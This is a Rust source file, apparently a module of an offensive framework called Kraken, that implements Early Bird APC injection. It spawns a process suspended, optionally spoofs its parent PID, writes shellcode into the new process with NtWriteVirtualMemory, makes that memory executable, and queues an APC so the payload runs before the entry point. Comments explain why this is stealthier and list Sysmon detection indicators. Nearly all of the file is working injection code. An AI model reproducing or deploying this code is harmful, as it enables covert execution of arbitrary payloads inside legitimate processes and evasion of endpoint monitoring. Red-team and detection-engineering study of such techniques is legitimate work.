//! Tier 3 Variant: Early Bird APC Injection
//!
//! Injects into a newly spawned process before the main thread starts:
//! - Create process in suspended state (CREATE_SUSPENDED)
//! - Allocate memory and write shellcode
//! - Queue APC to the suspended main thread
//! - Resume the process - APC executes before entry point
//!
//! This technique is stealthier than classic APC injection because:
//! - Target process is clean (no prior execution)
//! - APC executes in the context of process initialization
//! - No need to find an alertable thread (main thread is inherently alertable)
//!
//! Detection: Sysmon Event 1 (ProcessCreate) with CREATE_SUSPENDED,
//! followed by Event 10 (ProcessAccess) and remote memory operations

#[cfg(windows)]
use crate::{handle::OwnedHandle, InjectionResult};
#[cfg(windows)]
use common::KrakenError;

#[cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
#[cfg(windows)]
use ntapi::winapi::ctypes::c_void as nt_void;
#[cfg(windows)]
use windows_sys::Win32::Foundation::NTSTATUS;
#[cfg(windows)]
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
#[cfg(windows)]
use windows_sys::Win32::System::Threading::{
    CreateProcessW, GetThreadId, QueueUserAPC, ResumeThread, TerminateProcess,
    CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW,
};
#[cfg(windows)]
use super::ppid;

/// Check if NTSTATUS indicates success
#[cfg(windows)]
#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

/// Retrieve the thread ID from a thread handle.
#[cfg(windows)]
#[inline]
fn get_thread_id_from_handle(handle: windows_sys::Win32::Foundation::HANDLE) -> u32 {
    unsafe { GetThreadId(handle) }
}

/// Inject using Early Bird APC technique
///
/// # Arguments
/// * `executable_path` - Path to executable to spawn (e.g., "C:\\Windows\\System32\\notepad.exe")
/// * `shellcode` - The shellcode bytes to inject
/// * `wait` - Whether to wait for APC execution (approximate via sleep)
/// * `timeout_ms` - Timeout in milliseconds
/// * `parent_pid` - Optional PID to spoof as parent (T1134.004). When `Some`,
///   `create_process_with_ppid` is used instead of plain `CreateProcessW`.
///
/// # Returns
/// * `Ok(InjectionResult)` on success
/// * `Err(KrakenError)` on failure
///
/// # Detection Indicators
/// - Process creation with CREATE_SUSPENDED flag
/// - Immediate cross-process memory allocation after spawn
/// - QueueUserAPC to main thread before first resume
/// - Sysmon: Event 1 (ProcessCreate) → Event 10 (ProcessAccess) → Event 8 pattern
/// - When PPID spoofing is used: ParentProcessId mismatch in Sysmon Event 1
#[cfg(windows)]
pub fn inject(
    executable_path: &str,
    shellcode: &[u8],
    wait: bool,
    timeout_ms: u32,
    parent_pid: Option<u32>,
) -> Result<InjectionResult, KrakenError> {
    // Spawn the target process suspended, optionally with PPID spoofing.
    let (proc_handle_raw, thread_handle_raw, target_pid, main_thread_id) =
        if let Some(ppid) = parent_pid {
            let (ph, th, pid) =
                ppid::create_process_with_ppid(ppid, executable_path, true)?;
            // Query thread id — PROCESS_INFORMATION gives us dwThreadId; ppid
            // helper returns (hProcess, hThread, pid). We need to get the thread
            // id from the PROCESS_INFORMATION which ppid::create_process_with_ppid
            // wraps. We expose it via an extended helper below.
            //
            // For now use the thread handle to derive tid via a snapshot query,
            // OR restructure ppid to return (HANDLE, HANDLE, pid, tid).
            // We choose the simplest path: expose tid via the ppid helper.
            let tid = get_thread_id_from_handle(th);
            (ph, th, pid, tid)
        } else {
            // Convert path to wide string
            let wide_path: Vec<u16> = executable_path
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            // Initialize startup info and process info
            let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
            startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

            let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

            // Create process in suspended state
            let result = unsafe {
                CreateProcessW(
                    wide_path.as_ptr(),
                    std::ptr::null_mut(), // command line
                    std::ptr::null(),     // process security attributes
                    std::ptr::null(),     // thread security attributes
                    0,                    // inherit handles
                    CREATE_SUSPENDED,     // creation flags - KEY: suspended
                    std::ptr::null(),     // environment
                    std::ptr::null(),     // current directory
                    &startup_info,
                    &mut process_info,
                )
            };

            if result == 0 {
                return Err(KrakenError::Module(format!(
                    "CreateProcessW failed for '{}'",
                    executable_path
                )));
            }

            (
                process_info.hProcess,
                process_info.hThread,
                process_info.dwProcessId,
                process_info.dwThreadId,
            )
        };

    let proc_handle = OwnedHandle::new(proc_handle_raw)
        .ok_or_else(|| KrakenError::Module("invalid process handle".into()))?;
    let thread_handle = OwnedHandle::new(thread_handle_raw)
        .ok_or_else(|| KrakenError::Module("invalid thread handle".into()))?;

    tracing::debug!(
        target_pid,
        main_thread_id,
        executable = %executable_path,
        "spawned suspended process for Early Bird injection"
    );

    // Allocate memory in the suspended process
    let mut base_address: *mut nt_void = std::ptr::null_mut();
    let mut region_size: usize = shellcode.len();

    let status = unsafe {
        NtAllocateVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if !nt_success(status) {
        // Cleanup: terminate the suspended process
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtAllocateVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(
        target_pid,
        addr = ?base_address,
        size = region_size,
        "allocated memory in suspended process"
    );

    // Write shellcode
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            proc_handle.as_raw() as *mut _,
            base_address,
            shellcode.as_ptr() as *mut _,
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtWriteVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    // Change protection to RX
    let mut protect_size: usize = shellcode.len();
    let mut old_protect: u32 = 0;
    let status = unsafe {
        NtProtectVirtualMemory(
            proc_handle.as_raw() as *mut _,
            &mut base_address as *mut *mut nt_void,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if !nt_success(status) {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module(format!(
            "NtProtectVirtualMemory failed: 0x{:08X}",
            status
        )));
    }

    tracing::debug!(target_pid, "changed memory protection to RX");

    // Queue APC to the suspended main thread
    // This APC will execute when the thread is resumed, BEFORE the entry point
    let apc_result = unsafe {
        QueueUserAPC(
            Some(std::mem::transmute(base_address)),
            thread_handle.as_raw(),
            0,
        )
    };

    if apc_result == 0 {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module("QueueUserAPC failed".into()));
    }

    tracing::debug!(
        target_pid,
        main_thread_id,
        "queued APC to suspended main thread"
    );

    // Resume the main thread - APC executes immediately
    let suspend_count = unsafe { ResumeThread(thread_handle.as_raw()) };
    if suspend_count == u32::MAX {
        unsafe { TerminateProcess(proc_handle.as_raw(), 1) };
        return Err(KrakenError::Module("ResumeThread failed".into()));
    }

    tracing::info!(
        target_pid,
        main_thread_id,
        executable = %executable_path,
        "Early Bird injection complete - process resumed"
    );

    // Wait if requested
    if wait && timeout_ms > 0 {
        std::thread::sleep(std::time::Duration::from_millis(timeout_ms as u64));
    }

    Ok(InjectionResult {
        success: true,
        thread_id: Some(main_thread_id),
        technique_used: "Early Bird APC Injection".to_string(),
        error: None,
    })
}

/// Inject using Early Bird with default executable (notepad.exe) and no PPID spoofing
#[cfg(windows)]
pub fn inject_default(
    shellcode: &[u8],
    wait: bool,
    timeout_ms: u32,
) -> Result<InjectionResult, KrakenError> {
    inject(
        "C:\\Windows\\System32\\notepad.exe",
        shellcode,
        wait,
        timeout_ms,
        None,
    )
}

#[cfg(not(windows))]
pub fn inject(
    _executable_path: &str,
    _shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
    _parent_pid: Option<u32>,
) -> Result<crate::InjectionResult, common::KrakenError> {
    Err(common::KrakenError::Module(
        "Early Bird injection only supported on Windows".into(),
    ))
}

#[cfg(not(windows))]
pub fn inject_default(
    _shellcode: &[u8],
    _wait: bool,
    _timeout_ms: u32,
) -> Result<crate::InjectionResult, common::KrakenError> {
    Err(common::KrakenError::Module(
        "Early Bird injection only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn test_inject_non_windows() {
        let result = inject("notepad.exe", &[0x90], false, 0, None);
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    #[cfg(not(windows))]
    #[test]
    fn test_inject_with_ppid_non_windows() {
        let result = inject("notepad.exe", &[0x90], false, 0, Some(1234));
        assert!(result.is_err());
        if let Err(common::KrakenError::Module(msg)) = result {
            assert!(msg.contains("only supported on Windows"));
        }
    }

    #[cfg(not(windows))]
    #[test]
    fn test_inject_default_non_windows() {
        let result = inject_default(&[0x90], false, 0);
        assert!(result.is_err());
    }
}
